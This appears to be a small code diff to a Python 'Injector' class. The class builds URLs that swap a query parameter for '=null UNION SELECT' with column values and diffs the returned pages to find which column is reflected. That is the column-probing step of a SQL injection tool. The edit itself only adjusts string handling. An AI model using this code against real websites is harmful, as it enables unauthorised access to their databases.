@@ -88,8 +88,8 @@ class Injector:
         new_url = page.split('=')[0] + '=null' + '%20UNION%20SELECT' + ",".join(union_urls)
 
         diff = self.html_diff(self.get_page(page), self.get_page(new_url))
-        nums = [filter(str.isdigit, re.sub('<.*>','', line)) for line in diff]
-        nums.remove('')
+        nums = [filter(str.isdigit, str(re.sub('<.*>','', line))) for line in diff]
+        #nums.remove('')
 
         return Counter(nums).most_common(1)[0][0]
         
